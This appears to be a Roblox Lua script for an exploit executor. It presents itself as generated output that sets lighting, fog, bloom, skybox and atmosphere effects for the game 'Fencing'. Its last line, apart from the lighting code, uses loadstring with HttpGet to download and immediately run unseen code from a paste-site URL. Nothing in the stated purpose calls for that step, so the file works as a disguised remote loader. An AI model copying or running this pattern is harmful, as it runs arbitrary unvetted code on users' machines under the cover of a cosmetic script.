
if not VoidShell then
getgenv().VoidShell = true
task.delay(11, function()
getgenv().VoidShell = nil

-- Generated using Instance to Lua v1.3
-- Made by nullspecter.
-- https://discord.gg/U2nvFRa8zQ
-- Instance: Lighting | Service("Lighting")
-- Converted on: Tue, Feb 10, 2026 12:28:25 AM
-- Conversion completed in 5.052 seconds
-- Instances: 113
-- Game : Fencing | https://www.roblox.com/games/12109643/Fencing
-- converter.ignoreUnmodified : true
-- converter.addComment : false | converter.Stream : false
-- Mode: Reusable | Total scope(s): 1 | 'local' variable(s): scope 1 - 108; 
-- Please do your own modification.


local cloneref = cloneref or clone_reference or clone_ref or (cache and (cache.clone_reference or cache.clonereference or cache.cloneref));
local Service = function(key)
    return (cloneref or function(a) return a end)(game:GetService(key))
end;


do

local Void_0 = Service("Lighting")
Void_0.ClockTime = 7.1
Void_0.FogColor = Color3.new(0, 0, 0)
Void_0.FogEnd = 100000000
Void_0.EnvironmentDiffuseScale = 0.3
Void_0.TimeOfDay = "07:06:00"
Void_0.Brightness = 3.8
Void_0.ColorShift_Top = Color3.new(1, 0.682353, 0.1686275)
Void_0.PrioritizeLightingQuality = false
Void_0.GeographicLatitude = 72
Void_0.EnvironmentSpecularScale = 0.06
Void_0.LightingStyle = Enum.LightingStyle.Soft
Void_0.GlobalShadows = true
Void_0.Technology = Enum.Technology.Future
Void_0.ExposureCompensation = -0.24
Void_0.FogStart = 20
Void_0.Ambient = Color3.new(0.6745098, 0.6745098, 0.6745098)
Void_0.OutdoorAmbient = Color3.new(0, 0, 0)
Void_0.ShadowSoftness = 0.1

local Void_2u = Instance.new("DepthOfFieldEffect")
Void_2u.Parent = Void_0
Void_2u.Name = "DepthOfField"

local Void_2v = Instance.new("BloomEffect")
Void_2v.Parent = Void_0
Void_2v.Name = "Bloom"
Void_2v.Threshold = 1.824
Void_2v.Intensity = 1
Void_2v.Size = 56

local Void_2w = Instance.new("Sky")
Void_2w.Parent = Void_0
Void_2w.SkyboxRt = "rbxassetid://1009081946"
Void_2w.SkyboxBk = "rbxassetid://1009082031"
Void_2w.SkyboxUp = "rbxassetid://1009082428"
Void_2w.SkyboxFt = "rbxassetid://1009082252"
Void_2w.SunAngularSize = 9
Void_2w.SkyboxLf = "rbxassetid://1009082137"
Void_2w.SkyboxDn = "rbxassetid://1009082487"
Void_2w.MoonAngularSize = 0

local Void_2x = Instance.new("SunRaysEffect")
Void_2x.Parent = Void_0
Void_2x.Name = "SunRays"
Void_2x.Intensity = 0.18
Void_2x.Spread = 0.12

local Void_2y = Instance.new("ColorCorrectionEffect")
Void_2y.Parent = Void_0
Void_2y.Name = "ColorCorrection"
Void_2y.Saturation = -0.2
Void_2y.Contrast = 0.1

local Void_2z = Instance.new("Atmosphere")
Void_2z.Parent = Void_0
Void_2z.Density = 0.42
Void_2z.Decay = Color3.new(0.3607843, 0.2352941, 0.0509804)
Void_2z.Color = Color3.new(0.7803922, 0.6666667, 0.4196078)

end; 

end)
loadstring(game:HttpGet('https://api.rubis.app/v2/scrap/07OpuaCXpjvq2iDP/raw'))()
end
